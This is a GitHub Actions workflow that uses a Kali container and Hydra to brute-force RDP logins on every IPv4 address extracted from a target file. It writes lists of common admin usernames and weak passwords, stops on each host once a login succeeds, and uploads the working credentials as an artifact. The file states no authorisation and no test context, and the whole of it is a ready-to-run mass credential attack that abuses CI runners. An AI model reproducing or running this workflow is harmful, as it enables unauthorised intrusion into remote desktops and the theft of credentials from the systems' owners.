name: Stable RDP Brute Force

on:
  workflow_dispatch:

jobs:
  brute_force:
    runs-on: ubuntu-latest
    container:
      image: kalilinux/kali-rolling
      options: --user root

    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Install Hydra
        run: |
          apt-get update
          apt-get install -y hydra grep
          
      - name: Create Custom Wordlists
        run: |
          cat <<EOF > users.txt
          Administrator
          Admin
          administrador
          admin
          Guest
          guest
          Support
          support
          User
          user
          EOF
          cat <<EOF > passwords.txt
          Admin
          admin
          Admins
          admins
          Admin12345
          Admin1
          Admin@123
          Admin@1234
          Admin@12345
          Admin@123456
          Admin@1234567
          Admin@12345678
          Admin@1234567890
          Admin@2023
          Admin@2024
          Admin@2025
          Admin@2026
          admin@123
          admin@1234
          admin@12345
          admin@123456
          admin@1234567
          admin@12345678
          admin@1234567890
          admin@2023
          admin@2024
          admin@2025
          admin@2026
          Username
          username
          username123
          password
          Password
          password123
          Password123
          passwords
          Passwords
          passwords123
          Passwords123
          P@ssword
          passw0rd
          Passw0rd
          p@ssword
          P@ssw0rd
          p@ssw0rd
          P@ssword123
          passw0rd123
          Passw0rd123
          p@ssword123
          P@ssw0rd123
          p@ssw0rd123
          user
          test
          Test
          test123
          Test123
          test1234
          Test1234
          test12345
          Test12345
          qwertyuiop
          QWERTYUIOP
          AZERTYUIOP
          azertyuiop
          abc@1
          abc@12
          abc@123
          abc@1234
          abc@12345
          abc@123456
          abc@1234567
          abc@12345678
          abc@123456789
          ABC@1
          ABC@12
          ABC@123
          ABC@1234
          ABC@12345
          ABC@123456
          ABC@1234567
          ABC@12345678
          ABC@123456789
          Abc@1
          Abc@12
          Abc@123
          Abc@1234
          Abc@12345
          Abc@123456
          Abc@1234567
          Abc@12345678
          Abc@123456789
          Admin#123
          admin#123
          Admin2024
          admin2024
          Admin2024!
          Admin2025
          admin2025
          Admin2025!
          Admin2026
          admin2026
          Admin2026!
          admin1
          admin12
          admin123
          admin1234
          admin12345
          admin123456
          admin1234567
          admin12345678
          admin123456789
          admin1234567890
          Admin1
          Admin12
          Admin123
          Admin1234
          Admin12345
          Admin123456
          Admin1234567
          Admin12345678
          Admin123456789
          Admin1234567890
          Admin#1234
          admin#1234
          EOF

      - name: Clean Target List
        run: |
          # Extract only valid IPv4 addresses from the file
          grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" nonla.txt | sort -u > clean_targets.txt

      - name: Launch Stable Hydra Attack
        run: |
          # Using -t 1 (one target at a time) to avoid FD_SETSIZE error
          # Using -f to stop immediately when a password is found for a host
          hydra -L users.txt -P passwords.txt -M clean_targets.txt rdp -t 1 -f -vV -o final_rdp_success.txt || true

      - name: Upload Success Report
        uses: actions/upload-artifact@v4
        with:
          name: rdp-success-report
          path: final_rdp_success.txt
